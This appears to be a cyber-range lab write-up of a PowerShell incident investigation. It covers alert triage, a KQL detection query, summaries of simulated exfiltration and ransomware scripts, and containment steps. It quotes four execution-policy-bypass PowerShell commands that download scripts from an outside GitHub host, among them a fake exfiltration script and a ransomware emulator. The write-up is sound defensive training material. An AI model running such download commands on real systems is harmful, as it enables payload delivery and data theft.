<p align="center">
  <img src="https://github.com/user-attachments/assets/4a9b499f-2301-49f5-9a60-5521b5c35fca" alt="Description" width="600">
</p>

# PowerShell-Suspicious-Web-Request

## Platforms and Languages Leveraged
- Windows 10 Virtual Machines (Microsoft Azure)
- Microsoft Sentinel 
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)

---

##  Scenario

Sometimes when a bad actor has access to a system, they will attempt to download malicious payloads or tools directly from the internet to expand their control or establish persistence. This is often achieved using legitimate system utilities like PowerShell to blend in with normal activity. By leveraging commands such as Invoke-WebRequest, they can download files or scripts from an external server and immediately execute them, bypassing traditional defenses or detection mechanisms. This tactic is a hallmark of post-exploitation activity, enabling them to deploy malware, exfiltrate data, or establish communication channels with a command-and-control (C2) server. Detecting this behavior is critical to identifying and disrupting an ongoing attack.

---

## Detection & Analysis

An alert titled “Kyle – PowerShell Suspicious Web Request” was triggered on the device kylesvm. During investigation, it was discovered that the following four distinct PowerShell web requests were executed using Invoke-WebRequest to download scripts from a GitHub repository:

---

## PowerShell Commands Executed:

- powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range /entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1

- powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range /entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1

- powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range /entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
  
- powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range /entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
---

## Interview 

The incident was tied to a single user on one device. When contacted, the user reported attempting to install free software, after which a black screen appeared briefly with no noticeable outcome.

---

## Execution Confirmation

Using Microsoft Defender for Endpoint (MDE), it was confirmed that the scripts were executed on the host. The following KQL query was used to verify execution:

**Query used to locate events:**

```kql
let TargetHostname = "kylesvm";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]); DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
| summarize Count = count() by AccountName, DeviceName, FileName, ProcessCommandLine
```
---

## Malware Analysis Summary

The downloaded scripts were submitted to the malware reverse engineering team, and the following behaviors were identified:

- exfiltratedata.ps1 Generates simulated employee data, compresses it via 7-Zip, and uploads it to Azure Blob Storage to emulate data exfiltration.
- eicar.ps1 Creates the EICAR test file used to simulate antivirus detection and response mechanisms.
- portscan.ps1 Performs a network scan over a local IP range for common open ports, logging the results.
- pwncrypt.ps1 Emulates ransomware by generating fake files, encrypting them, and leaving ransom instructions on the desktop.

---
  
## Containment, Eradication & Recovery

- The affected device (kylesvm) was isolated via MDE.
- A full anti-malware scan was performed.
- No active malware was found; the device was subsequently removed from isolation. 

---

## Post-Incident Activities

- The involved user was required to complete additional security awareness training.
- The organization’s KnowBe4 security package was upgraded, and training frequency
increased.
- A new PowerShell usage policy was introduced to restrict PowerShell access for
non-essential users. 
